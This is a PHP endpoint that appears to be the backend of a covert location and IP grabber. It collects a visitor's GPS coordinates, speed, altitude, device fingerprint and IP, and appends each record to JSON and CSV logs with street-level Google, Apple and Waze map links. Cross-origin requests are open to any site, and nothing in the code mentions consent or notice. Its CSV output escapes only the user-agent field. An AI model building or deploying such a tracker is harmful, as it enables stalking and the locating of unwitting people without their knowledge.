<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Real IP detection
function getRealIP() {
    $headers = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_CLIENT_IP', 'HTTP_X_CLUSTER_CLIENT_IP'];
    foreach ($headers as $header) {
        if (isset($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            return trim($ips[0]);
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

$ip = getRealIP();
$input = json_decode(file_get_contents('php://input'), true) ?: [];

// Complete tracking data
$track = [
    'timestamp' => date('Y-m-d H:i:s T'),
    'ip' => $ip,
    'lat' => $input['lat'] ?? 'N/A',
    'lon' => $input['lon'] ?? 'N/A',
    'accuracy' => $input['accuracy'] ?? 'N/A',
    'altitude' => $input['altitude'] ?? 'N/A',
    'speed' => $input['speed'] ?? 'N/A',
    'google_maps' => ($input['lat'] && $input['lon']) ? 
        "https://www.google.com/maps?q={$input['lat']},{$input['lon']}&z=18" : '',
    'apple_maps' => ($input['lat'] && $input['lon']) ? 
        "maps://maps.apple.com/?q={$input['lat']},{$input['lon']}&z=18" : '',
    'waze_maps' => ($input['lat'] && $input['lon']) ? 
        "https://waze.com/ul?q={$input['lat']},{$input['lon']}" : '',
    'userAgent' => $input['userAgent'] ?? 'N/A',
    'platform' => $input['platform'] ?? 'N/A',
    'language' => $input['language'] ?? 'N/A',
    'screen' => $input['screen'] ?? 'N/A',
    'city' => $input['city'] ?? 'N/A'
];

// Save JSON (pretty formatted)
$tracks = json_decode(file_get_contents('tracks.json'), true) ?: [];
$tracks[] = $track;
file_put_contents('tracks.json', json_encode($tracks, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);

// Save CSV
$csvHeaders = ['Timestamp','IP','Lat','Lon','Accuracy','Google Maps','City','UA'];
if (!file_exists('tracks.csv')) {
    file_put_contents('tracks.csv', implode(',', $csvHeaders) . "\n");
}
$csvLine = sprintf('"%s","%s","%s","%s","%s","%s","%s","%s"',
    $track['timestamp'], $track['ip'], $track['lat'], $track['lon'],
    $track['accuracy'], $track['google_maps'], $track['city'],
    str_replace('"', '""', substr($track['userAgent'], 0, 100))
);
file_put_contents('tracks.csv', $csvLine . "\n", FILE_APPEND | LOCK_EX);

echo json_encode(['status' => 'success', 'total_tracks' => count($tracks)]);
?>
